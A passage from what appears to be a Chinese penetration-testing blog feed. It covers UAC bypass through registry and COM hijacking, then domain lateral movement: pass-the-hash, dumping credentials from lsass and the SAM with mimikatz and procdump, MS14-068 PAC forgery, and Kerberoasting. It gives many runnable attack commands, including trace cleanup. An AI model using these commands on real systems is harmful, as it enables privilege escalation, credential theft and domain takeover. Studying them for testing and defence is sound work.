alt="image-20210302194843185"></p><p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。<br>我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p><p>然后消除痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure><h3 id="sdclt"><a href="#sdclt" class="headerlink" title="sdclt"></a>sdclt</h3><p>Win10后这个程序才有自动提升权限的能力</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" alt="image-20210302201240945"></p><h3 id="eventvmr"><a href="#eventvmr" class="headerlink" title="eventvmr"></a>eventvmr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure><p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p><h2 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h2><p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID</span><br><span class="line">HKCR\CLSID</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</span><br></pre></td></tr></table></figure><p>以eventvwr为例</p><p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p><p>而eventvwr的这个组件一般在HKCR\CLSID找到，所以可以搜索路径劫持。</p><p>利用以下方法可以劫持（搜索路径劫持）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;&quot; &#x2F;t REG_SZ &#x2F;d &quot;d:\msf_x64.dll&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;LoadWithoutCOM&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;ThreadingModel&quot; &#x2F;t REG_SZ &#x2F;d &quot;Apartment&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;HideOnDesktop&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;Attributes&quot; &#x2F;t REG_DWORD &#x2F;d 0xf090013d &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="利用com接口"><a href="#利用com接口" class="headerlink" title="利用com接口"></a>利用com接口</h2><h3 id="ICMLuaUtil"><a href="#ICMLuaUtil" class="headerlink" title="ICMLuaUtil"></a>ICMLuaUtil</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210304122737764.png" alt="image-20210304122737764"></p><h1 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h1><p>一个开源项目，记录了许多Bypassuac的方法。</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p><h1 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;p&gt;用户帐户控制（User Account Control，简写作UAC)是&lt;a href=&quot;https://baike.baidu.c</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>横向移动与域控权限维持方法总汇</title>
    <link href="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</id>
    <published>2021-06-28T13:51:58.227Z</published>
    <updated>2021-08-03T04:44:49.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p><p>那前提就是要获取hash值了</p><h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a><strong>KB2871997</strong></h3><p>如果系统安装<strong>KB2871997</strong>补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码</p><p>虽然可以通过修改注册表来使LSASS强制存储明文密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure><p>但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。</p><p>同时比较重要的一点是增加了Protected Users组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击，以及用户注销后删除凭证(明文密码、LM/NTLM HASH、Kerberos的TGT票据等)</p><p>以及：Restricted Admin RDP模式的远程桌面客户端支持</p><h3 id="关于KB2871997的一个误解"><a href="#关于KB2871997的一个误解" class="headerlink" title="关于KB2871997的一个误解"></a>关于KB2871997的一个误解</h3><p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash。</p><p>很多人把这个原因归结于KB2871997补丁，实际上不然，这个事情的成因实际是UAC在捣乱。UAC是window Vista的新安全组件，具体是个啥这里也不细说了。<br>RID为500的账户和属于本地administrators组的域用户在通过网络远程链接时，默认就是高权限令牌。<br>而非RID500的本地账户则为低权限令牌，若想提升权限则需通过交互方式登录到要通过远程协助或远程桌面管理的计算机走UAC提权。</p><p>关于这个成因的一些系统配置选项：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202713388.png" alt="image-20210726202713388"></p><p>这个项默认允许内置管理员账户（RID500账户）在所有应用下都以高权限令牌运行。这也是RID500账户能PTH的原因</p><p>以及此注册表项，可以关闭UAC的远程限制，即远程连接时UAC会失效，这样的话只要是administrators组的用户都能PTH辣。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202837971.png" alt="image-20210726202837971"></p><p>其中该值为0则代表开启UAC的远程限制,设置该值为1时</p><h3 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h3><p>1.使用meterpreter里的mimikatz模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.使用meterpreter自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure><p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p><p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p><p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQ截图20210217130719"></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.使用cobalt strike 获取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure><p>6.利用sam表</p><p>mimikatz在线读sam表中的hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>将sam表下载到本地由mimikatz分析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h3 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h3><p>1.msf里使用psexec模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.使用mimikatz</p><p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure><p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.使用cobalt strike</p><p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQ截图20210217130746"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQ截图20210217130806"></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这个洞的危害很大，可以让任意域用户提权到域管。<br>适用版本: server 2000以上<br>补丁: kb3011780</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。<br>在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。<br>PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p><p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p><p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p><p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p><p>PAC自身的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQ截图20210217131035"></p><p>PAC在Ticket中的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQ截图20210217131108"></p><p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。<br>而Authorization data的结构是这样的</p><p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p><p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。<br>若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。<br>PACTYPE包含的是 cBuffers,版本以及缓冲区 。<br>PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p><table><thead><tr><th>0x00000001</th><th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th></tr></thead><tbody><tr><td>0x00000002</td><td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td>0x00000006</td><td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td></tr><tr><td>0x00000007</td><td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td></tr><tr><td>0x0000000A</td><td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000B</td><td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000C</td><td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td></tr><tr><td>0x0000000D</td><td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000E</td><td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000F</td><td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td></tr></tbody></table><p>其中比较重要的是1,6和7</p><p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure><p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>这个漏洞的产生主要是微软犯下了三个错误：<br>1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的<br>2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC<br>3.下面再说</p><p>那么这个漏洞大致的攻击原理是什么呢。<br>首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p><p>那么伪造PAC，我们就遇到了两个问题：<br>1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。<br>2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p><p>来说说如何绕过PAC校验和问题。<br>我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p><p>再来说说如何绕过krbtgt hash加密TGT的问题。<br>因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。<br>这样KDC依旧会正常解析这个TGS_REQ包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQ截图20210217132156"></p><p>注意TGS_REQ里的include-pac依旧是false。<br><strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong><br>上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p><p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p><h3 id="M14068利用"><a href="#M14068利用" class="headerlink" title="M14068利用"></a>M14068利用</h3><p>1.工具kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>具体方法为，在kekeo里先执行 kerberos::purge清空票据<br>然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQ截图20210217132222"></p><p>然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p><p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p><p>这个工具好用,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQ截图20210217132233"></p><p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用<br>另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.<br>但返回的似乎不是域控？</p><h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p><h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>如何得到域中的所有SPN？</p><p><strong>1.setspn</strong><br>很简单，只需执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>即可</p><p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQ截图20210217132445"></p><h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>如何得到hash？<br>有如下方法</p><p><strong>1.Rubeus.exe</strong></p><p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p><p>然后执行 Rubeus.exe kerberoast指令即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQ截图20210217132502"></p><p><strong>2.mimikatz</strong></p><p>mimikatz真的神器。<br>通过命令 kerberos::ask /target:你所指定的SPN,</p><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p><p>即可通过认证的方式得到一个ST。<br>然后我们在kerberos::list里可以看到我们想要的ST</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQ截图20210217132529"></p><p><strong>3.powershell</strong></p><p>越来越发现powershell在域渗透中的重要性了<br>输入以下指令，即可完成HASH获取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure><p>然后mimikatz导出即可</p><h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>获得了ST票据，但怎么导出？</p><p><strong>1.mimikatz</strong></p><p>导出所有票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQ截图20210217132544"></p><p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p><p><strong>2.Empire Powershell 框架</strong></p><p>github:<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>我们通过这个框架可以导出hashcat格式的hash.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat 